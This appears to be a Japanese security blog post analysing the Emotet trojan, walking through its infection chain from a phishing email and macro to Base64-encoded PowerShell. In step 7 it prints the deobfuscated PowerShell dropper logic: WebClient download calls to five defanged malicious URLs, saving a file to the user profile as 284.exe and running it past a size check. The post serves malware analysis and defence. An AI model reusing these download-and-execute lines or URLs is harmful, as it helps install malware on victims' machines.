---
date: 2022-10-13T04:00:00
draft: false
title: "Emotet マルウェアの分析"
description: 
featured_image: "cdn/respond/emotet-malware-analysis-1.png"
tags: ["Emotet", "トロイの木馬", "PowerShell", "マルウェア", "サイバーセキュリティ"]
---

## Emotetとは？

- 主にメールを通じて拡散されるトロイの木馬
- 正規のメールのように偽装し、ユーザーに悪意のあるファイルをクリックさせる手法
- トロイの木馬を更新し、システムにアクセスを確立した後、運営者が追加ペイロードをダウンロードできるようにする「ローダー」型のマルウェア
- 感染したホストから銀行の資格情報を盗む、被害者から金銭を搾取することを目的に動作
<br>

<!--more-->

![emotet-malware-analysis](https://blog.plura.io/cdn/respond/emotet-malware-analysis-1.png)

## Emotet 実行/分析

### 1. ソーシャルエンジニアリング手法を用いて攻撃対象にメールを送信
![02](https://github.com/user-attachments/assets/5dae9811-e676-4697-b7ee-a84f229d9b2b)
<br><br>


### 2. 攻撃対象が疑わず添付ファイルをダウンロード
![03](https://github.com/user-attachments/assets/e647b197-5a0b-47da-abd9-f13709fc17fc)
<br><br>


### 3. ファイルを開き、マクロを実行するため「コンテンツの有効化」をクリック
![04](https://github.com/user-attachments/assets/7f4d218d-10d8-4d50-a008-31c9ee7e304f)
<br><br>


### 4. Base64でエンコードされたコードがPowerShellプロセスで実行される
![05](https://github.com/user-attachments/assets/80f38782-331a-49e3-aebc-9ba41e7a2c36)
<br><br>


### 5. PowerShellコマンドによってconhostが実行
![06](https://github.com/user-attachments/assets/86c4c82b-baae-45af-b68b-e9cea82786aa)

![07](https://github.com/user-attachments/assets/ad597df8-9608-4995-9dfa-b6b38545088e)
<br><br>


### 6. PowerShellスクリプトコードの実行
![08](https://github.com/user-attachments/assets/54c535af-f81f-44d5-870e-d7d9e5de3d84)
<br><br>


### 7. PowerShellスクリプトコードの分析
![09](https://github.com/user-attachments/assets/e875c2f5-5371-41d6-97ea-f31777ccc789)
<br>

1) 以下のURLからファイルをダウンロード
new-object NeT.wEBClIEnt DOwNlOaDfiLe(hxxp://blockchainjoblist.com/wp-admin/014080/)
new-object NeT.wEBClIEnt DOwNlOaDfiLe(hxxps://womenempowermentpakistan.com/wp-admin/paba5q52/)
new-object NeT.wEBClIEnt DOwNlOaDfiLe(hxxps://atnimanvilla.com/wp-content/073735/)
new-object NeT.wEBClIEnt DOwNlOaDfiLe(hxxps://yeuquynhnhai.com/upload/41830/)
new-object NeT.wEBClIEnt DOwNlOaDfiLe(hxxps://deepikarai.com/js/4bzs6/)

2) 以下のパスにファイルを保存
$env:userprofile\284.exe

3) 23931バイト以上の場合実行
(Get-Item $env:userprofile\284.exe).LeNgTh -ge 23931

<br>

### 8. ユーザーフォルダーにファイル生成
![010](https://github.com/user-attachments/assets/c0522f7e-2c7c-4751-90c5-a3780de0902b)

![011](https://github.com/user-attachments/assets/3bf9893f-d832-4331-bc2b-5be171e84f9e)

![012](https://github.com/user-attachments/assets/773bc501-4236-4bbc-9766-510595828a77)
<br>

## [参考]
- https://en.wikipedia.org/wiki/Emotet<br>
- https://www.malwarebytes.com/emotet
